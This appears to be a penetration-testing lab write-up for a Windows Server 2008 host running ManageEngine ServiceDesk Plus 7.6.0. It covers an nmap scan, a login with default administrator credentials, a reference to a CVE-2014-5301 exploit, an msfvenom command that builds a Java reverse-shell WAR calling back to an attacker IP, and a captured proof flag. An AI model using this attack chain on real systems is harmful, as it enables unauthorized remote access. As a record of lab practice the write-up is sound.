## IP

```IP
192.168.57.43
```

## NMAP TCP

```nmap-helpdesk
??$ nmap -sC -sV 192.168.57.43 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-28 14:51 UTC
Nmap scan report for 192.168.57.43
Host is up (0.00077s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  ms-wbt-server Microsoft Terminal Service
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
|_http-server-header: Apache-Coyote/1.1
|_http-title: ManageEngine ServiceDesk Plus
Service Info: Host: HELPDESK; OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
| smb2-security-mode: 
|   2:0:2: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: HELPDESK
|   NetBIOS computer name: HELPDESK\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-04-28T07:51:37-07:00
| smb2-time: 
|   date: 2024-04-28T14:51:37
|_  start_date: 2024-04-28T14:49:58
|_clock-skew: mean: 2h19m59s, deviation: 4h02m29s, median: 0s
|_nbstat: NetBIOS name: HELPDESK, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:bf:6c:ef (VMware)
```


## 8080

ManageEngine Service Desk Plus version 
`Your Version 	: 7.6.0 Build 7601`

Default credentials

```ManageEngine-Default-Creds
administrator
administrator
```

Logged In

[CVE2014-5301](https://raw.githubusercontent.com/PeterSufliarsky/exploits/master/CVE-2014-5301.py) identified

Exploit to get shell

```war-reverse-tcp-msfvenom
msfvenom -p java/shell_reverse_tcp LHOST=192.168.49.57 LPORT=9002 -f war -o shell.war
```

Navigated to Desktop

proof: `aed6a5ec639b3a90c13ed1517017ddb6`

==DONE==